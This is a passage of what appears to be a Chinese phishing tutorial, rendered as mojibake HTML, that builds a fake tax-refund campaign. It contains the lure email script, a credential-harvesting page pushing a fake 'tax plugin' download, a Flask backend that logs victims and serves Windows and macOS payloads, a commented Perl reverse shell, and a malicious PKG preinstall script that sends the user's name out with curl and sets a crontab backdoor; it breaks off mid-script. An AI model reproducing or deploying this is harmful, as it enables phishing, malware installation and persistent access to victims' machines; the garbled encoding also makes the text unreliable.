æ”¿ç­–ï¼Œ2022å¹´åº•ç¨åŠ¡æ€»å±€å¯¹æ¯ä¸€åèŒå·¥çš„å…¨å¹´å·¥è–ªæ”¶å…¥å’Œå„ç±»æ‰£é™¤æƒ…å†µè¿›è¡Œäº†åˆ†ææµ‹ç®—ï¼ŒæŒ‰æ”¿ç­–å°†å¤§éƒ¨åˆ†èŒå·¥å¹´åº•å‘æ”¾çš„éƒ¨åˆ†ç»©æ•ˆç»“ç®—é‡‘é¢æŒ‰å…¨å¹´ä¸€æ¬¡æ€§å¥–é‡‘ä¼˜åŒ–è®¡ç¨ã€‚ä¼˜åŒ–åï¼Œæœ‰78.2%çš„èŒå·¥å¯èŠ‚çº¦ç¨é‡‘ã€‚åœ¨2023å¹´4æœˆä¸­æ—¬ç”³æŠ¥æœŸå®Œæˆå…¨å¹´ä¸€æ¬¡æ€§å¥–é‡‘çº³ç¨ç”³æŠ¥åï¼Œåç»­ä¼šæŒ‰ç¨‹åºå°†èŠ‚çº¦çš„ç¨é‡‘å‘è‡³èŒå·¥è´¦æˆ·ä¸Šï¼Œç”³æŠ¥æ“ä½œæµç¨‹ï¼Œè¯·æ®æ­¤è·³è½¬ç¨åŠ¡ç”³æŠ¥å¹³å°: &lt;a href='https://example.com/'>ç¨åŠ¡ç”³æŠ¥å¹³å°&lt;a>&lt;br>éœ€è¦è¯´æ˜ï¼šç»è¿‡å¯¹èŒå·¥å…¨å¹´åº”ç¼´ç¨é¢å’Œå·²æ‰£ç¨é¢å¯¹æ¯”ï¼Œéƒ¨åˆ†èŒå·¥éœ€è¦è¡¥ç¨ï¼Œè¡¥ç¨çš„é‡‘é¢å°†åœ¨åç»­å‘æ”¾çš„ç»©æ•ˆä¸­æ‰£é™¤ã€‚ç›¸å…³æ”¿ç­–èŒå·¥å¯é€šè¿‡æ­¤é“¾æ¥&lt;a href='http://www.chinatax.gov.cn'>http://www.chinatax.gov.cn/&lt;/a>æŸ¥çœ‹ã€‚"""</span>receives <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'john@victim.com'</span><span class="token punctuation">]</span><span class="token comment"># æ‚¨éœ€è¦ç™»å½•SendCloudåˆ›å»ºAPI_USERï¼Œä½¿ç”¨API_USERå’ŒAPI_KEYæ‰å¯ä»¥è¿›è¡Œé‚®ä»¶çš„å‘é€ã€‚</span>params <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string">"apiUser"</span><span class="token punctuation">:</span> <span class="token string">"&lt;Users>"</span><span class="token punctuation">,</span> \  <span class="token string">"apiKey"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;apikey>"</span><span class="token punctuation">,</span>\  <span class="token string">"from"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"fromName"</span> <span class="token punctuation">:</span> <span class="token string">"hr@example.com"</span><span class="token punctuation">,</span> \  <span class="token string">"to"</span> <span class="token punctuation">:</span> <span class="token string">"&lt;helo@victim.com>"</span><span class="token punctuation">,</span> \  <span class="token string">"subject"</span> <span class="token punctuation">:</span> <span class="token string">"ã€é‡è¦ã€‘å…³äº2023å¹´ä¸ªäººæ‰€å¾—ç¨ç¨æ”¶ä¼˜åŒ–"</span><span class="token punctuation">,</span> \  <span class="token string">"html"</span><span class="token punctuation">:</span> body<span class="token punctuation">,</span> \<span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> data<span class="token operator">=</span>params<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é’“é±¼çš„é¡µé¢"><a href="#é’“é±¼çš„é¡µé¢" class="headerlink" title="é’“é±¼çš„é¡µé¢"></a>é’“é±¼çš„é¡µé¢</h2><p>å¯¹è¾“å…¥çš„ä¿¡æ¯è¿›è¡Œåç«¯æäº¤ï¼Œè¾“å…¥å®Œæˆä¹‹åå¼¹æ¡†æç¤ºç”¨æˆ·ä¸‹è½½æ’ä»¶ï¼Œjsä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@4/bulma.css"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span><span class="token parameter">email</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[a-zA-Z0-9_\.-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">isChinese</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[\u4E00-\u9FA5]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">;</span>        <span class="token keyword">return</span> reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">login_submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> usernameInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> emailInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'è¯·è¾“å…¥ä¸­æ–‡å…¬å¸åç§°'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'error'</span><span class="token punctuation">,</span>            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Oops...'</span><span class="token punctuation">,</span>            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'è¯·è¾“å…¥æ­£ç¡®çš„é‚®ç®±åœ°å€!'</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isChinese</span><span class="token punctuation">(</span>usernameInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isValidEmail</span><span class="token punctuation">(</span>emailInput<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">const</span> corpname <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">const</span> email <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>                <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"corpname"</span><span class="token punctuation">,</span> corpname<span class="token punctuation">)</span><span class="token punctuation">;</span>                formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> http <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token string">'/login'</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                http<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//Call a function when the state changes.</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>http<span class="token punctuation">.</span>readyState <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">&amp;&amp;</span> http<span class="token punctuation">.</span>status <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                                       <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Win'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'æäº¤æˆåŠŸ!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'æ™šäº›ä¼šå‘æ‚¨å‘é€é‚®ä»¶é€šçŸ¥ï¼Œè¯·å®‰è£…ç¨åŠ¡ç³»ç»Ÿæ’ä»¶: &lt;a href="https://example.com/download/win">ç‚¹å‡»ä¸‹è½½&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                                                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>navigator<span class="token punctuation">.</span>platform<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'Mac'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            Swal<span class="token punctuation">.</span><span class="token function">fire</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>                            <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'æäº¤æˆåŠŸ!'</span><span class="token punctuation">,</span>                            <span class="token literal-property property">showCloseButton</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>                            <span class="token literal-property property">focusConfirm</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>                            <span class="token literal-property property">html</span><span class="token operator">:</span> <span class="token string">'æ™šäº›ä¼šå‘æ‚¨å‘é€é‚®ä»¶é€šçŸ¥ï¼Œè¯·å®‰è£…ç¨åŠ¡ç³»ç»Ÿæ’ä»¶: &lt;a href="https://example.com/download/osx">ç‚¹å‡»ä¸‹è½½&lt;/a> '</span><span class="token punctuation">,</span>                            <span class="token literal-property property">icon</span><span class="token operator">:</span> <span class="token string">'success'</span>                            <span class="token punctuation">&#125;</span>                            <span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                                           <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>                http<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>formData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="åç«¯ä»£ç "><a href="#åç«¯ä»£ç " class="headerlink" title="åç«¯ä»£ç "></a>åç«¯ä»£ç </h2><p>åç«¯éœ€è¦æ”¶é›†ç”¨æˆ·æäº¤çš„è¡¨å•ä¿¡æ¯ï¼Œå¦‚æœè¿è¡Œäº†EXEæˆ–è€…PKGéœ€è¦æŠŠç”¨æˆ·çš„ä¿¡æ¯ä¸Šä¼ åˆ°æœåŠ¡ç«¯ï¼Œæ•´ä½“ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding: utf-8</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> send_file<span class="token keyword">from</span> flask_cors <span class="token keyword">import</span> CORS<span class="token keyword">import</span> sqlite3<span class="token keyword">import</span> timeapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    CONN <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">'fish.db'</span><span class="token punctuation">)</span>    CURSOR <span class="token operator">=</span> CONN<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS users (                id INTEGER PRIMARY KEY AUTOINCREMENT,                corpname TEXT NOT NULL,                email TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            );        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS osx (                id INTEGER PRIMARY KEY AUTOINCREMENT,                osxname TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    CURSOR<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>        <span class="token triple-quoted-string string">"""        CREATE TABLE IF NOT EXISTS win (                id INTEGER PRIMARY KEY AUTOINCREMENT,                pcname TEXT NOT NULL,                username TEXT NOT NULL,                createdate DATETIME DEFAULT (DATETIME('now','localtime'))            )        """</span>    <span class="token punctuation">)</span><span class="token comment"># æ”¶é›†è¡¨å•æ•°æ®</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    corpname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'corpname'</span><span class="token punctuation">]</span>    email <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'email'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO users(corpname, email) VALUES (?, ?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>corpname<span class="token punctuation">,</span> email<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># è¿è¡ŒExeä¹‹åæ”¶é›†ç”¨æˆ·åå’Œpcnameï¼Œå®šä½å‘˜å·¥</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/windata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">windata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    pcname <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'pcname'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT INTO win(username, pcname) VALUES (?,?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> pcname<span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># è¿è¡Œäº†pkgçš„ä¼šæ–°å»ºä¸€ä¸ªå®šæ—¶ä»»åŠ¡åé—¨ï¼Œè¯·æ±‚è¿™ä¸ªURL</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdoor'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#return "perl -e 'use Socket;$i=\"&lt;ip>\";$p=10000;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\">&amp;S\");open(STDOUT,\">&amp;S\");open(STDERR,\">&amp;S\");exec(\"sh -i\");&#125;;' "</span>    <span class="token keyword">return</span> <span class="token string">"echo 'helo world'"</span><span class="token comment"># è¿è¡ŒPKGä¹‹åï¼Œæ”¶é›†ç”¨æˆ·åï¼Œå®šä½å‘˜å·¥</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/osxdata'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">osxdata</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"fish.db"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"INSERT  INTO osx(osxname) VALUES (?)"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Success"</span><span class="token comment"># ä¸‹è½½æ’ä»¶åŠŸèƒ½</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download/&lt;plat>'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>plat<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Disposition'</span><span class="token punctuation">:</span> <span class="token string">'attachment; filename=ç¨åŠ¡ç”³æŠ¥æ’ä»¶.zip'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"osx"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/finace.pkg"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"ç¨åŠ¡ç”³æŠ¥æ’ä»¶.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"sh"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/install.sh"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"ç¨åŠ¡ç”³æŠ¥æ’ä»¶.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> plat <span class="token operator">==</span> <span class="token string">"zip"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/osx.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"ç¨åŠ¡ç”³æŠ¥æ’ä»¶.zip"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">"fishbin/win.zip"</span><span class="token punctuation">,</span> as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> download_name<span class="token operator">=</span><span class="token string">"ç¨åŠ¡ç”³æŠ¥æ’ä»¶.zip"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="OS-Xçš„é’“é±¼å®è·µ"><a href="#OS-Xçš„é’“é±¼å®è·µ" class="headerlink" title="OS Xçš„é’“é±¼å®è·µ"></a>OS Xçš„é’“é±¼å®è·µ</h2><p>OS Xåœ¨å®é™…æµ‹è¯•ç¢°åˆ°å‡ ä¸ªé—®é¢˜ï¼š</p><ul><li>æ¯”å¦‚OS Xåº”è¯¥ç”¨ä»€ä¹ˆæœ¨é©¬å¹³å°</li><li>PKGå®‰è£…çš„æ—¶å€™æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œæ€ä¹ˆè·å–ç™»å½•çš„ç”¨æˆ·å</li><li>ä¸ºå•¥rootåå¼¹çš„pkgä¸èƒ½æŸ¥çœ‹æ™®é€šç”¨æˆ·çš„æ¡Œé¢ï¼ˆæ­¤å¤„æ˜¯å› ä¸ºTCCæœºåˆ¶ï¼‰</li></ul><h3 id="OS-Xçš„æ¶æ„PKG"><a href="#OS-Xçš„æ¶æ„PKG" class="headerlink" title="OS Xçš„æ¶æ„PKG"></a>OS Xçš„æ¶æ„PKG</h3><p>PKGçš„åˆ¶ä½œæœ€ç®€å•çš„å¯ä»¥å‚è€ƒ<a href="https://www.cnblogs.com/strengthen/p/15933420.html">è¿™ç¯‡æ–‡ç« </a>ï¼Œä½¿ç”¨<a href="http://s.sudre.free.fr/Software/Packages/about.html">Packages</a>ï¼Œåˆ©ç”¨preinstallè„šæœ¬ï¼Œè„šæœ¬çš„ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable"><span class="token environment constant">USER</span></span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>dscacheutil -q group -a name admin<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">users</span><span class="token operator">|</span><span class="token function">cut</span> -d <span class="token string">" "</span> -f <span class="token number">3</span><span class="token variable">)</span></span><span class="token function">curl</span> -XPOST https://example.com/osxdata -d <span class="token string">"user=<span class="token environment constant">$USER</span>"</span><span class="token function">crontab</span> -l <span class="token operator">></span> 